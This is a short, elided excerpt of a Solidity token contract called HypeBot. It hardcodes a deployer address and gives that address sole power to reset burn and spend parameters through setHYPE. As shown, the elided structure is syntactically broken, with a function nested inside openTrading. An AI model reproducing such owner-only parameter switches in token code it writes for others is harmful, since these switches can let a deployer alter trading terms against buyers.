...
pragma solidity ^0.8.20;
    ...
    contract HypeBot {
        ...
        address payable constant deployer = payable(address(0x723A265a7405E0497eb77E138B0CA687A3Fb51F7)); //
        ...
        function openTrading() external {
            ...
            function _setHYPE(uint256 newBurn, uint256 newSpend) private {
            BurnToken = newBurn;
            SpendToken = newSpend;
            }

        function setHYPE(uint256 newBurn, uint256 newSpend) external {
            if(msg.sender != deployer)        
                revert Permissions();
            _setHYPE(newBurn, newSpend);
            }
        }